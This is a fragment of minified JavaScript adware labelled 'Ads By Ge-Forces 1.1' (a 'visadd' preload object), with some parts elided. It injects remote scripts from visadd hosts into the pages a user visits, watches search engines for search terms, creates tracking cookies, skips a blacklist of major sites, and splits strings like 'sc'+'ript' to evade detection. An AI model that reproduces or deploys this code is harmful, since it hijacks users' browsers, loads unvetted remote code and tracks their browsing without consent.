(function(){if(window.visadd){var encoded_partner='14567725765';if(encoded_partner!=visadd.preload.encoded_partner){try{var sub_id='540172910324000000';if(encoded_partner=="14567725798"||encoded_partner=="14567725764"||encoded_partner=="14567725690"){if(typeof(vadims_sub_id)!='undefined'){sub_id=vadims_sub_id;}}
var unit_code_url='//a.visadd.com/internal/blocked?v=2&subid='+sub_id+'&format=1&ai=992&ctxu='+ escape(visadd.preload.encoded_partner)+'&sid='+ encoded_partner;visadd.preload.injectScript(unit_code_url);}catch(e){}}}else{window.visadd={};visadd.preload={domain_blacklist:';google;facebook;mail.aol.com;mail.yahoo.com;webmail;ads.yahoo.com;youtube.com;imprim-encre.com;cartouche.com;wikipedia.com;1800petmeds.com;',domain_restricted:'',domain_search:';bing.com;ask.com;search.yahoo.com;search.aol.com;google;',page_blacklist:'',encoded_partner:'14567725765',sub_id:'540172910324000000',unit_marker:'Ads By Ge-Forces 1.1',unit_marker_url:null,issued_request:false,search_term_to_use:null,over_cap:false,cap_x24:10,language:function(){try{var lang_dict={"br":"pt","it":"it","es":"es","fr":"fr","de":"de","mx":"es","ar":"es","co":"es","cl":"es"};var curr_host=document.location.host;curr_host_split=curr_host.split(".")
...
return lang;},injectScript:function(url){var script=document.createElement('sc'+'ript');script.setAttribute('type','text/jav'+'ascri'+'pt');script.type='text/jav'+'ascri'+'pt';script.src=url;if(document.body){document.body.appendChild(script);}else{var hs=document.getElementsByTagName('head');if(hs&&hs.length>0){var h=hs[0]
h.appendChild(script);}}},checkDomain:function(ourHostName,list)
{var i,subsHosts;if(ourHostName==undefined||ourHostName.length==0)
return false;ourHostName=ourHostName.toLowerCase();ourHostName=ourHostName.replace("www.","");var ourHostName2=null;subsHosts=ourHostName.replace(/[^.]/g,"").length;for(i=0;i<=subsHosts;i++){if(list.indexOf(";"+ourHostName+";")!=-1){return true;}
...
visadd.preload.injectScript(visadd.preload.protocol()+'//'+ script_domain+'/cookies/create.js?'+ params);}else if(visadd.preload.search_check_count<10){visadd.preload.search_check_count=visadd.preload.search_check_count+ 1;setTimeout(function(){visadd.preload.onSearchReady();},500);}},init:function(){if(window.top!=window.self)
{return;}
